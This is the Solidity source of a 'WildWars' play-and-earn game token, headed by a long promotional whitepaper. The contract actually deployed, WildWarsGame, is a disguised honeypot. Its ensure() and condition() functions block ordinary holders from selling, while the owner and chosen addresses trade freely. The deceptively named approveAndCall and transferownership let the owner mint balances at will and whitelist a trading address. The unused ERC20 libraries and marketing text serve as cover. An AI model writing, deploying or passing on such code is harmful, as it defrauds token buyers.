/**
 *Submitted for verification at Etherscan.io on 2022-04-29
*/

/*Welcome to WildWars. 
we will share our vision, introduce our team and give detailed explanations about our products. 
We will provide you with all information needed to engage with our community and products. 
WildWars will mainly revolve around Play & Earn. 
Our main focus is quality on the long run. We want to avoid rushing towards our goals because 
creating a healthy economic environment takes time and patience. This is a process in which 
we want to involve the community. Since Play & Earn is a new concept it's very innovative. 
This is both a possibility and a threath as we have lots of fresh ideas to implement but 
have a narrow database to tackle common issues. We will provide ways of earning valuable 
property which you can be the owner of, no intermediaries involved. We have seen big gaming 
corporates achieving the craving for earning digital property with virtual value. 
The blockchain enables possibilities to establish a safe & healthy economic environment to 
approach this differently, so that players truly own what they obtain. So, what is Play & 
Earn? Simply put, you can earn currency and NFT's by playing games. We collaborate with 
game developers and blockchain developers to make products/services that contain the best 
of both. If you posess the sufficient funds to participate, you can play our games with the
potential of earning valuable NFT's. But most importantly, you can enjoy a great experience
and battle your way to the top of the leaderboards.
WildWars is more than just collectibles. It is an Play-to-earn RTS NFT game taking place in 
a fantasy world. It is also an inspiration and a character in the gaming metaverse, where 
you can use your animal to participate in the game's special features, particularly the 
Play-to-earn mechanism.
After a year of progression, the decentralized gaming industry has witnessed many new 
products, which attract millions of new users who believe they can enjoy playing games & 
earning money at the same time.
Also at the same time, millions of new users mint/trade and collect Non-fungible tokens, 
or NFTs. They are the digital tokens that offer the uniqueness and every related information 
such as the creator, the current ownership, and the entire sales history that is verifiable 
in blockchain. We believe that the current trending metaverse will be the last piece to lift 
the blockchain game industry to a whole new level, where every player can enjoy games, make 
a profit or interact
with other people through chat, voice, VR and other means. That means we can truly live a 
second life in a world parallel to the real one. WildWars will contribute our part in developing 
the metaverse.
Build your base, create units, conquer territories and defeat all enemies! Unleash your power 
in fast and intense real-time battles with fury and funny animals! Classical RTS direct control 
system improved by touch innovation! Use your fingers and become the greatest commander! The 
more you play, the better! Infinite Units with unique abilities and their own destiny. Invent 
victorious strategies with your army! Create custom maps with the in-game editor! Show your 
imagination, create your maps and battle with your friends in multiple game modes! Thousands 
of players are waiting for you on the battlefield! WildWars is a unique classic PvP real-time 
strategy single screen game for mobile!
Token Summary
WildWars token (WILDWARS) is known as the governance token.
Total Supply : 600.000.000 WILDWARS
Oracle System 
The Purpose
The Oracle system's goal is to maintain the economy of the game balanced around a set dollar 
value. WildWars creates a correlation between active users and the dollar value of the WILDWARS
token by using the Oracle system. 
The Reason
The Oracle will ensure consistent dollar value payouts when it is made, and that minting costs 
for NFTs remain consistent in dollar value. This means that entry costs and rewards can be balanced
and maintained over long periods and will accurately reflect the desired minting costs, which can be appropriately reflected to allow new 
players to participate even if the WILDWARS token's dollar value rises. This is the primary function 
of the game to help balance the system, reduce selling pressure, and attract new investors with a 
variety of appealing features.
Gaming Features
1.Play And Earn
With Play-And-Earn Model instead of Play-To-Earn Model, the game focuses more on the gameplay and 
increases the player’s experiences. WildWars wants to bring the community the game battles which 
can give the players joy and financial success.
2.Recruitment
Recruitment is a feature that allows players to enlist more WILDWARS NFT Heroes by utilizing those 
they already have. You are required to hold $WILDWARS to recruit a hero. It should be noted that 
these figures may change depending on the game's economic balance. The WILDWARS required per recruitment
may be changed.
3.PVE & PVP
Use your Animal for fighting in PVE to receive rewards of WILDWARS tokens and experience for levelling. 
Higher attribute stats have an important role in getting better fighting records in the PvP arena.
4.Item Upgrading
Each WildWars has a fixed number of equipment slots depending on how rare they are. The minimum is 4 
slots and the maximum is 7 slots, and they provide a boost to the stats of the WildWars. WildWarss with 
better stats can go further and have a better chance of gaining new upgrading materials, support materials 
& WildWars NFT.
When participating in game, the player will have a chance to receive a Majestic Chest. They can open this 
chest for a small charge and have a chance to receive upgrading materials & WildWars NFT, which has a certain 
drop rate.
The upgrading material can be traded on the in-game market & secondary market.
There is a success rate when players use upgrading material. If successful, the Equipment will boost the 
WildWars stats. There is a chance that the upgrading materials will be destroyed due to failure. However, 
if players also use support material, their chance of successful upgrading will be higher.
Each time, the item upgrade will cost WILDWARS token and upgrading materials.
5.The WILDWARS Championship
The WILDWARS Championship will be scheduled automatically every weekend.
WILDWARS NFT Owners can choose to participate in the event, and if they can achieve a high rank on the 
leaderboard, they will be rewarded with a part of the WILDWARS (WildWars Token) weekly prize pool.
The tournament will have 3 main stages:
• The qualifier with Single Elimination format for unranking and low-ranking players.
• The group stage with Bo2 format for seeding players and qualified players.
• The champion stage with Bo3 & Double Elimination format.
6. Character Informations
Character Informations
WildWars Attribute
There are 4 main stats for each character, including:
• HP: Hit point
• MP: Mana point
• ATK: Attack power
• DEF: Defense power.
These stats are affected by 5 base attributes:
• STR (Strength): Strength measures the physical power of the WildWars.
• DEX (Dexterity): Dexterity measures the agility, balance and reflex of the WildWars.
• VIT (Vitality): Vitality measures the endurance, stamina and the number of health of the WildWars.
• INT (Intelligence): Intelligence measures knowledge & memory of the WildWars.
• Luck: Luck measures how lucky the WildWars is.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}

contract WildWarsGame {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
       if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}